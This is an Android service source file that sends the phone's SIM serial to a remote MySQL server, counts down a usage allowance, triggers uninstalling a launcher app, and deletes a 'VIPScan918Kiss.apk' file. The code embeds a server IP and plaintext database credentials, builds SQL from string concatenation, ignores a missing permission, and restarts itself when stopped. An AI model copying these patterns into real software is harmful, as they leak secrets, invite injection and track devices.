package com.feitan.login;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;

import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Timer;
import java.util.TimerTask;

public class MyService extends Service {

    public int counter = 0;
    //static String CURRENT_PACKAGE_NAME = "com.supertipspro.launcher";
    private String sim = "";
    private String result = "";
    Context context;
    private int afT = 0;
    private static long delay = 60000;

    public MyService(Context applicationContext) {
        super();
        context = applicationContext;
        Log.i("HERE", "here service created!");
    }

    public MyService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager tm = (TelephonyManager)
                getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
        }
        sim = tm.getSimSerialNumber();
    }

    private boolean appInstalledOrNot(String app_install) {
        PackageManager pm = getPackageManager();
        try {
            pm.getPackageInfo(app_install, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
        }

        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        super.onStartCommand(intent, flags, startId);
        startTimer();
        try {
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        try {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
            Class.forName("com.mysql.jdbc.Driver");
            Connection con = DriverManager.getConnection("jdbc:mysql://150.107.31.177:3306/android", "android", "@android177");
            Statement st = con.createStatement();
            ResultSet rs = st.executeQuery("select time from person where simid='" + sim + "'");

            while (rs.next()) {
                result += rs.getInt(1);
            }
            afT = Integer.parseInt(result)-1;
            if (afT <= 0) {
                if (appInstalledOrNot("com.supertipspro.launcher")) {
                    Intent uninstall = new Intent(getApplicationContext(), Helper.class);
                    uninstall.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    getApplicationContext().startActivity(uninstall);
                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (appInstalledOrNot("com.supertipspro.launcher")) {
                        Intent popup = new Intent(getApplicationContext(), DialogActivity.class);
                        popup.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        getApplicationContext().startActivity(popup);
                    }
                }
            } else {
                st.executeUpdate("UPDATE person SET time=" + afT + " WHERE simid='" + sim + "'");
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        } if(appInstalledOrNot("com.supertipspro.launcher")) {
            File folder = Environment.getExternalStorageDirectory();
            String fileName = folder.getPath() + "/Trash/VIPScan918Kiss.apk";
            File myFile = new File(fileName);
            if (myFile.exists()) {
                myFile.delete();
            }
        }
        stopSelf();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Log.i("EXIT", "ondestroy!");

        Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
        sendBroadcast(broadcastIntent);
        stoptimertask();
    }

    private Timer timer;
    private TimerTask timerTask;

    public void startTimer() {
        //set a new Timer
        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 1000, 1000); //
    }

    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                Log.i("in timer", "in timer ++++  " + (counter++));
            }
        };
    }

    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
